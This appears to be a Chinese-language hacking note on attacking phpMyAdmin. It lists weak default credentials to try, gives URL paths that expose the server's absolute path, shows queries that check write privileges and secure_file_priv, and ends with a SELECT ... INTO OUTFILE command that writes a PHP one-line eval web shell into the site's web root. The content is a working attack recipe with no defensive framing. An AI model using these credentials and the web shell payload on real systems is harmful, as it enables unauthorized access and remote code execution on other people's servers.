# phpMyAdmin

phpMyAdmin 的漏洞，大多需要登录后台才能利用

## 弱口令

| 用户名            | 密码                 | 
|---------------|---------------------|
| root | root | 
|root|(空格)|
|root|toor| 
|mysql|mysql|
|mysql|root| 
|mysql|(空格)|   
|mysql|toor| 


## 方法一：select into outfile
### 利用条件

1. 当前「数据库用户」有写权限
2. 知道网站绝对路径
3. 网站路径具有写权限（需要 secure_file_priv 设置为空）

针对第一点，我们可以使用如下命令查看（root 用户不用查看，具有写权限）
```
select * from mysql.user where user='<USER>'\G
```
针对第二点，爆 PHP 绝对路径的方法有很多：

```
phpmyadmin爆路径
说明：
一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。
1. /phpmyadmin/libraries/lect_lang.lib.php
2./phpMyAdmin/index.php?lang[]=1
3. /phpMyAdmin/phpinfo.php
4. load_file()
5./phpmyadmin/themes/darkblue_orange/layout.inc.php
6./phpmyadmin/libraries/select_lang.lib.php
7./phpmyadmin/libraries/lect_lang.lib.php
8./phpmyadmin/libraries/mcrypt.lib.php
```

针对第三点，我们可以使用如下命令查看：
```
show global variables like '%secure%';
```
- 若`secure_file_priv` 为 `NULL` ，表示对任意目录没有写权限
- 若`secure_file_priv` 为具体路径 ，表示仅对该路劲有写权限
- 若`secure_file_priv` 为空（如下图） ，表示对任意路径有写入权限

![image.png](https://i.loli.net/2020/08/08/rxDc5avnVGyF8zW.png)


如果确认三个条件都满足，则可使用如下命令写入一句话 shell：
```
# usr/www/html/ 换成你获取到的网站绝对路径
select "<?php @eval($_POST['shell']);?>" into outfile '/usr/www/html/shell.php'
```
